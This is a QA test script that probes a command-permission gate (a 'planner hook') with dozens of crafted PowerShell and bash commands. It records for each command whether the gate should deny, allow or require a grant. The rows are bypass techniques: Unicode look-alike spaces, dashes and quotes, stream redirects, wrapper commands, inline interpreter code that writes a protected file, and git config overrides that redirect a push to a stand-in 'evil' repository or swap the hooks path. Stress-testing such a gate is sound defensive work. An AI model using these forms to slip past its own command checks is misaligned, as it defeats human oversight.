// QA 241: targeted probes of the r6 parse gate, through the REAL built CLI with fixture stdin.
// Each row: the command, the shell, and what the PROPERTY requires (deny | allow | grant). The real-shell
// truth for every row that the hook allows but the property says must be denied is checked by shell-truth-r6.mjs.
// Usage: node probe-r6.mjs <out.json>
import { writeFileSync } from "node:fs";
import { makeFixture, runAll, bash, pwsh } from "./qa237/lib.mjs";

const FX = makeFixture("C:/qa-scratch/qa246-rprobe-fx");
const T = "open-brain/src/x.ts";
const NBSP = "\u00a0", EN = "\u2013", EM = "\u2014", LSQ = "\u2018", RSQ = "\u2019", LDQ = "\u201c", RDQ = "\u201d", IDSP = "\u3000", FWGT = "\uff1e";
const rows = [
  // PowerShell: characters PowerShell treats as whitespace, dashes or quotes, which the gate reads as word characters
  ["ps", `Set-Content${NBSP}${T} x`, "deny", "PS NBSP between cmdlet and path"],
  ["ps", `Copy-Item C:/qa-tmp/a.txt${NBSP}${T}`, "deny", "PS NBSP between source and destination"],
  ["ps", `Write-Output x >${NBSP}${T}`, "deny", "PS NBSP after >"],
  ["ps", `Set-Content${IDSP}${T} x`, "deny", "PS ideographic space between cmdlet and path"],
  ["ps", `Set-Content ${EN}Value x ${T}`, "deny", "PS en-dash parameter -Value read as a positional"],
  ["ps", `Set-Content ${EM}Value x ${T}`, "deny", "PS em-dash parameter"],
  ["ps", `Set-Content ${EN}EA 0 ${T} x`, "deny", "PS en-dash common parameter (unknown param check skipped?)"],
  ["ps", `Set-Content ${LSQ}${T}${RSQ} x`, "deny", "PS curly single quotes around the path"],
  ["ps", `Set-Content ${LDQ}${T}${RDQ} x`, "deny", "PS curly double quotes around the path"],
  ["ps", `gh pr ${LDQ}merge${RDQ} 2`, "grant", "PS gh pr \u201cmerge\u201d 2"],
  ["ps", `gh pr ${LSQ}merge${RSQ} 2`, "grant", "PS gh pr \u2018merge\u2019 2"],
  ["ps", `git ${LSQ}merge${RSQ} feature`, "grant", "PS git \u2018merge\u2019 feature"],
  ["ps", `git push ${EN}${EN}force origin loop/x`, "grant", "PS git push en-dash en-dash force (native: passed literally)"],
  // PowerShell -Param: forms
  ["ps", `Set-Content -Path: ${T} -Value x`, "deny", "PS -Path: <space> value"],
  ["ps", `Set-Content -Path:${T} -Value x`, "deny", "PS -Path:value control"],
  ["ps", `Set-Content -Path:"${T}" -Value x`, "deny", "PS -Path:\"value\" control"],
  ["ps", `Copy-Item C:/qa-tmp/a.txt -Destination: ${T}`, "deny", "PS -Destination: <space> value"],
  ["ps", `New-Item -Name ${T} -ItemType File`, "deny", "PS New-Item -Name only (relative to cwd)"],
  ["ps", `New-Item -Name x.ts -ItemType File`, "deny", "PS New-Item -Name only, cwd open-brain/src", "open-brain/src"],
  ["ps", `Write-Output x 3> ${T}`, "deny", "PS 3> warning-stream redirect"],
  ["ps", `Write-Output x 6> ${T}`, "deny", "PS 6> information-stream redirect"],
  ["ps", `Write-Output x 1> ${T}`, "deny", "PS 1> redirect"],
  ["ps", `Write-Output x 2>&1 > ${T}`, "deny", "PS 2>&1 then > control"],
  ["ps", `Write-Output x >> ${T}`, "deny", "PS >> control"],
  ["ps", `Write-Output x | Out-File ${T}`, "deny", "PS Out-File control"],
  ["ps", `Set-Content -Path ${T},C:/qa-tmp/o.txt x`, "deny", "PS unquoted comma list"],
  ["ps", `Set-Content -Path 'C:/qa-tmp/o.txt','${T}' x`, "deny", "PS quoted comma list"],
  ["ps", `Set-Content C:/qa-tmp/o.txt -Value 'a,b'`, "allow", "PS quoted comma in a value, outside"],
  ["ps", `Set-Content -Va x ${T}`, "deny", "PS -Va prefix"],
  ["ps", `Set-Content -LiteralPath ${T} -Value x`, "deny", "PS -LiteralPath control"],
  // Bash
  ["bash", `> ${T}`, "deny", "bash bare redirect, no command"],
  ["bash", `ls 2> ${T}`, "deny", "bash 2> target"],
  ["bash", `ls &> ${T}`, "deny", "bash &> target"],
  ["bash", `ls > C:/qa-tmp/o.txt 2>&1`, "allow", "bash 2>&1 outside"],
  ["bash", `echo x${FWGT}${T}`, "allow", "bash fullwidth > is a word character (no redirect)"],
  ["bash", `echo x >${NBSP}${T}`, "allow-or-deny", "bash NBSP after > (bash: part of the name)"],
  ["bash", `git commit -m "a > b # c"`, "allow", "bash quoted data with > and #"],
  ["bash", `git commit -m 'a; rm x'`, "allow", "bash quoted ; is data"],
  ["bash", `cp a.ts open-brain/'src'/x.ts`, "deny", "bash quote inside a word"],
  ["bash", `cp a.ts "open-brain"/src/x.ts`, "deny", "bash dq inside a word"],
  ["bash", `g'it' merge feature`, "grant", "bash g'it' merge"],
  ["bash", `git 'merge' feature`, "grant", "bash git 'merge'"],
  ["bash", `gh pr 'merge' 2`, "grant", "bash gh pr 'merge' 2 (no token: grant)"],
  ["bash", `gh pr merge '#7'`, "grant", "bash quoted '#7' (read, no token: grant)"],
  ["bash", `gh pr merge #7`, "p0", "bash unquoted #7"],
  ["bash", `gh pr comment 5 --body merge`, "allow", "bash non-merge comment"],
  ["bash", `gh -R melvenac/x pr merge 2`, "grant", "bash gh -R before pr"],
  ["bash", `gh pr -R melvenac/x merge 2`, "grant", "bash gh pr -R between"],
  ["bash", `gh --repo=melvenac/x pr merge 2`, "grant", "bash --repo= before pr"],
  ["bash", `git -c alias.st=status status`, "grant", "bash -c alias. on a real subcommand"],
  ["bash", `git -c remote.origin.url=https://github.com/evil/x push origin loop/x`, "grant", "bash -c remote."],
  ["bash", `git -c url.https://github.com/evil/.insteadOf=https://github.com/melvenac/ push origin loop/x`, "grant", "bash -c url."],
  ["bash", `git -c include.path=C:/qa-tmp/x status`, "grant", "bash -c include."],
  ["bash", `git -c includeIf.onbranch:x.path=C:/qa-tmp/x status`, "grant", "bash -c includeIf."],
  ["bash", `git -c INCLUDEIF.onbranch:x.path=C:/qa-tmp/x status`, "grant", "bash -c INCLUDEIF. (git keys are case-insensitive)"],
  ["bash", `git -c Core.pager=cat log`, "grant", "bash -c Core. mixed case"],
  ["bash", `git --config-env=alias.st=X status`, "grant", "bash --config-env=alias."],
  ["bash", `git --config-env core.pager=X log`, "grant", "bash --config-env core. (separate)"],
  ["bash", `git -c user.name=q status`, "allow", "bash -c user. (not risky)"],
  ["bash", `GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=remote.origin.url GIT_CONFIG_VALUE_0=https://github.com/evil/x git push origin loop/x`, "grant", "bash env GIT_CONFIG_KEY_0=remote. (the -c ruling through the environment)"],
  ["bash", `GIT_CONFIG_PARAMETERS="'remote.origin.url'='https://github.com/evil/x'" git push origin loop/x`, "grant", "bash env GIT_CONFIG_PARAMETERS remote."],
  ["bash", `git push origin loop/x`, "allow", "bash standing push control"],
  ["bash", `git push origin loop/x master`, "grant", "bash push with master"],
  ["bash", `env git merge feature`, "grant", "bash env git merge"],
  ["bash", `command git merge feature`, "grant", "bash command git merge"],
  ["bash", `nohup git merge feature`, "grant", "bash nohup git merge"],
  ["bash", `env cp a.ts ${T}`, "deny", "bash env cp"],
  ["bash", `A=1 cp a.ts ${T}`, "deny", "bash assignment then cp"],
  ["bash", `sh -c 'cp a.ts ${T}'`, "deny", "bash sh -c string gated and read"],
  ["bash", `sh -c 'git merge feature'`, "grant", "bash sh -c git merge"],
  ["bash", `sh -c "gh pr merge 2"`, "grant", "bash sh -c gh merge"],
  // inline code and code-running builtins: refused, or stated in the limit text
  ["bash", `node --eval="require('fs').writeFileSync('${T}','x')"`, "deny-or-limit", "node --eval=<code>"],
  ["bash", `node -pe "require('fs').writeFileSync('${T}','x')"`, "deny-or-limit", "node -pe"],
  ["bash", `node -e"require('fs').writeFileSync('${T}','x')"`, "deny-or-limit", "node -e attached"],
  ["bash", `python -c"open('${T}','w').write('x')"`, "deny-or-limit", "python -c attached"],
  ["bash", `python -Ic "open('${T}','w').write('x')"`, "deny-or-limit", "python -Ic cluster"],
  ["bash", `python3.12 -c "open('${T}','w').write('x')"`, "deny-or-limit", "python3.12 -c"],
  ["bash", `perl -e'open(F,">${T}")'`, "deny-or-limit", "perl -e attached"],
  ["bash", `perl -we 'open(F,">${T}")'`, "deny-or-limit", "perl -we cluster"],
  ["bash", `ruby -e'File.write("${T}","x")'`, "deny-or-limit", "ruby -e attached"],
  ["bash", `awk 'BEGIN{print "x" > "${T}"}'`, "deny-or-limit", "awk print > file"],
  ["bash", `awk 'BEGIN{system("echo x > ${T}")}'`, "deny-or-limit", "awk system()"],
  ["bash", `trap 'echo x > ${T}' EXIT`, "deny-or-limit", "trap code string (a code-running builtin)"],
  ["bash", `mapfile -C 'echo x > ${T};:' -c 1 < README.md`, "deny-or-limit", "mapfile -C callback"],
  ["bash", `sort -o ${T} README.md`, "deny-or-limit", "sort -o"],
  ["bash", `find . -maxdepth 0 -fprint ${T}`, "deny-or-limit", "find -fprint"],
  ["bash", `git -c core.hooksPath=C:/qa-tmp commit -m x`, "grant", "git -c core.hooksPath (needs a grant)"],
];
const cases = rows.map(([sh, command, expect, label, sub], k) => ({
  id: k, label, sh, command, expect,
  payload: (sh === "ps" ? pwsh : bash)(command, sub ? `${FX}/${sub}` : FX),
}));
const res = await runAll(cases, 4, undefined, FX);
const P0 = /not statically parseable: /;
const out = res.map(({ payload, ...r }) => {
  const kind = r.decision === "allow" ? "allow" : P0.test(r.reason) && /^Planner hook: denied — not statically/.test(r.reason) ? "p0" : /D-038/.test(r.reason) ? "grant" : r.decision === "deny" ? "deny" : r.decision;
  const ok = r.expect === kind || (r.expect === "deny" && (kind === "p0" || kind === "grant")) || (r.expect === "grant" && kind === "p0")
    || r.expect === "allow-or-deny" || (r.expect === "deny-or-limit" && kind !== "allow");
  return { ...r, got: kind, ok, reason: r.reason.slice(0, 220) };
});
for (const r of out) console.log(`${r.ok ? "ok  " : r.expect === "deny-or-limit" ? "LIM " : "FAIL"} ${r.got.padEnd(6)} expect=${r.expect.padEnd(13)} ${r.label} :: ${JSON.stringify(r.command)}${r.ok ? "" : "  // " + r.reason.slice(0, 120)}`);
writeFileSync(process.argv[2], JSON.stringify(out, null, 1));
